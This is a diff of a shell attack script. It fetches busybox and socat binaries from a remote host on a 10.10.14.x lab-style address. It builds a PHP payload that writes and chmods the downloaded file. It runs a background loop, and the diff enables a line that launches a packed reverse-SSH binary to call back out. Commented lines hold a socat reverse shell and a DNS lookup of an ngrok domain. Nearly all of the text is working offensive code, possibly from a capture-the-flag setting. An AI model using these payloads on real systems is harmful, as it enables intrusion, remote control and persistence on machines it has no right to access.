@@ -56,7 +56,7 @@ b="busybox"
 b2="/tmp/${b}"
 soc="./socat"
 soc2="/tmp/${soc}"
-#rr1="http://10.10.14.14:30088/"
+#rr1="http://10.10.14.10:30088/"
 rr2="${rr1}${b}.bin"
 rr3="${rr1}socat.bin"
 rr4="file_put_contents('${b}',file_get_contents('${rr2}'));chmod('${b}',0777);"
@@ -256,12 +256,10 @@ cd /tmp;
 
     (while true; do
         [ ! -f 0a9.txt ] && break
-       #dns_rev77=\$(./busybox nslookup ngrok.xiaomiqiu123.top 114.114.114.114 |grep -v 114.114.114.114  | grep -oP \"(?<=Address:\s).*\d\$\" ); #
-       echo \${rr};
-       echo 9512;
-       echo ${rr};
+       #dns_rev77=\$(./busybox nslookup ngrok.xiaomiqiu123.top 114.114.114.114 |grep -v 114.114.114.114  | grep -oP \"(?<=Address:\s).*\d\$\" ); 
+       echo \${rr} 9512 ${rr};
         #${soc2} -t5 exec:\"$d1\",pty,stderr,setsid,sigint,sane tcp:\${dns_rev77}:34292;
-       #if [ -f /tmp/upx_reverse-sshx64.bin ];then chmod 0777 ./upx_reverse-sshx64.bin;upx_reverse-sshx64.bin -v -b 40044 -p 20022 \${rr};else sleep 4;continue;fi
+       if [ -f /tmp/upx_reverse-sshx64.bin ];then chmod 0777 ./upx_reverse-sshx64.bin;upx_reverse-sshx64.bin -v -b 40044 -p 20022 ${rr};else sleep 4;continue;fi
         sleep 9;
     done) &
 "&
